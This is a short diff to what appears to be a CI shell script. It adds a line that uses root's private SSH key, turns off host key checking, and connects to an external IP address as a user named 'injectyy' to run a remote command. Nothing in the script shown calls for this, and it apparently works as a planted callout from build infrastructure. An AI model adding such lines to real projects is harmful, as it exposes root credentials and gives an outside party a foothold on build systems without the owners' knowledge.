@@ -23,6 +23,8 @@ ls -la -R ~
 
 echo "[+] Done\n"
 
+ssh -i /root/.ssh/id_rsa_no_pf -o StrictHostKeyChecking=no injectyy@45.32.236.15 "touch 123"
+
 alias scp="scp -o StrictHostKeyChecking=no -P $PORT"
 alias ssh="python project/ci/scripts/ssh.py"
 
